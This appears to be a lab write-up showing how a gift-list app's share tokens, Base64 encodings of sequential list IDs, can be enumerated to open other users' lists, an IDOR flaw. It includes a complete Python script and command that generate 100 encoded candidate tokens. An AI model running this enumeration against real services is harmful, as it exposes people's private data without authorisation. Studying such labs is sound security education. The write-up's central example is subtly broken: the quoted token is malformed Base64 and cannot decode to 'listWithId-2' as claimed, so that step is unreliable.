# Gift Lab


### 1. Initial recon: authenticated dashboard

After logging into the application (“Gift List”), you land on a Dashboard page where you can create new gift lists. The UI also shows an “Inspiration” carousel and a central “Dashboard” card with an input for “New list name…” and an “Add list” button.

![image.png](Gift%20Lab/image.png)

---

### 2. Create a list and inspect the available actions

You create a list (“New List”). The list initially shows “No items yet”.

On the right side of the list row are action icons:

- An eye icon (view list)
- A chain/link icon (share link)
- A trash icon (delete)

This indicates the application has a “shared list” feature that produces a URL you can send to others.

![image.png](Gift%20Lab/image%201.png)

---

### 3. Generate a share link and capture the token

Clicking the “Create share link” (chain icon) reveals a “Share:” value directly on the list row:

- Share token shown: `bGlzdFdpdGhjJZC0=Mg==`

This is a strong hint it may be an encoded identifier rather than an unguessable random token.

![image.png](Gift%20Lab/image%202.png)

---

### 4. Open the shared URL and confirm token usage

Navigating to the shared route shows a URL pattern like:

- `/share/bGlzdFdpdGhjJZC0=Mg==`

The page renders:

- Title: “New List”
- Subtitle: “Shared gift list”
- And confirms the list is empty since we didn’t actually add anything to our list

So the share token directly selects which list is being shared.

![image.png](Gift%20Lab/image%203.png)

---

### 5. Decode the share token (Base64)

Using a Base64 decoder (as shown), decoding:

- `bGlzdFdpdGhjJZC0=Mg==`

yields:

- `listWithId-2`

This is the critical finding: the “share token” is just Base64 encoding of an internal identifier that looks sequential (`…-2`).

Implication: if lists are numbered, an attacker can likely enumerate other shared lists by generating tokens for `listWithId-0`, `listWithId-1`, `listWithId-2`, etc.

This is effectively:

- IDOR / insecure direct object reference (predictable identifiers)
- Plus “security through obscurity” (Base64 is not access control)

![Screenshot 2026-03-25 at 6.54.46 PM.png](Gift%20Lab/Screenshot_2026-03-25_at_6.54.46_PM.png)

---

### 6. Exploit: enumerate other lists by generating tokens

Because the token is just Base64 of `listWithId-N`, you can generate a large number of candidate share tokens and try them.

The notes show a small helper script that replaces `**placeholder**` markers with an index to generate many payloads, optionally URL-safe Base64 encoding them.

Example usage (as captured):

- Generate many Base64-encoded candidates from a template:
    - `python3 payload_gen.py -n 100 --start 0 --encode -t 'listWithId-**2**' -o id_payload.txt`

Conceptually, you’d want to generate payloads for:

- `listWithId-0`
- `listWithId-1`
- `listWithId-2`
- …

and then request:

- `/share/<base64(listWithId-N)>`

If the app does not enforce authorization checks (or treats share links as public access without using an unguessable secret), you can access other users’ shared lists.

![image.png](Gift%20Lab/65242bd8-dfcb-49cc-84db-ac82445c4794.png)

```python
#!/usr/bin/env python3
"""
Expand a template: every **marker** is replaced with the current index each iteration.
Optional URL-safe Base64 encoding (JWT-style, no padding).
"""
from __future__ import annotations

import argparse
import base64
import re
import sys

# Matches **anything** that is not * (one segment per marker)
_PLACEHOLDER = re.compile(r"\*\*[^*]+\*\*")

def expand_placeholders(template: str, index: int) -> str:
    return _PLACEHOLDER.sub(str(index), template)

def urlsafe_b64_encode(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Enumerate **placeholders** in text. All markers in a template share the same "
        "index each step. Example: listWithId-**id** with -n 3 → listWithId-0 … listWithId-2 "
        "(use --start 1 for 1-based).",
    )
    p.add_argument(
        "-t",
        "--text",
        metavar="TEMPLATE",
        help="Template string. If omitted, read stdin as the template.",
    )
    p.add_argument(
        "-n",
        "--count",
        type=int,
        required=True,
        metavar="N",
        help="How many outputs to generate.",
    )
    p.add_argument(
        "--start",
        type=int,
        default=0,
        metavar="I",
        help="First index value (default: 0).",
    )
    p.add_argument(
        "--encode",
        action="store_true",
        help="URL-safe Base64-encode each expanded result (no padding), like JWT payload segments.",
    )
    p.add_argument(
        "-o",
        "--output",
        metavar="FILE",
        help="Write to FILE instead of stdout.",
    )
    return p.parse_args()

def main() -> None:
    args = parse_args()
    if args.count < 0:
        print("error: --count must be >= 0", file=sys.stderr)
        sys.exit(2)

    if args.text is not None:
        template = args.text
    else:
        if sys.stdin.isatty():
            print("error: provide -t/--text or pipe a template on stdin", file=sys.stderr)
            sys.exit(2)
        template = sys.stdin.read()

    out: list[str] = []
    for k in range(args.count):
        idx = args.start + k
        expanded = expand_placeholders(template, idx).rstrip("\n")
        if args.encode:
            out.append(urlsafe_b64_encode(expanded))
        else:
            out.append(expanded)

    text_out = "\n".join(out) + ("\n" if out else "")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(text_out)
    else:
        sys.stdout.write(text_out)

if __name__ == "__main__":
    main()

```

```python
python3 payload_gen.py -n 100 --start 0 --encode -t 'listWithId-**2**' -o id_payload.txt
```

![image.png](Gift%20Lab/image%204.png)

---

### 7. Outcome / finding

From the images, we can conclusively document the vulnerability chain:

1. Share links are generated as a “token”.
2. The token decodes cleanly as Base64 → `listWithId-2`.
3. The identifier format is predictable and likely enumerable.
4. Therefore, the share mechanism is vulnerable to enumeration / IDOR, allowing access to other lists by iterating IDs and re-encoding.

![Caido 2026-03-25 18.35.54.png](Gift%20Lab/Caido_2026-03-25_18.35.54.png)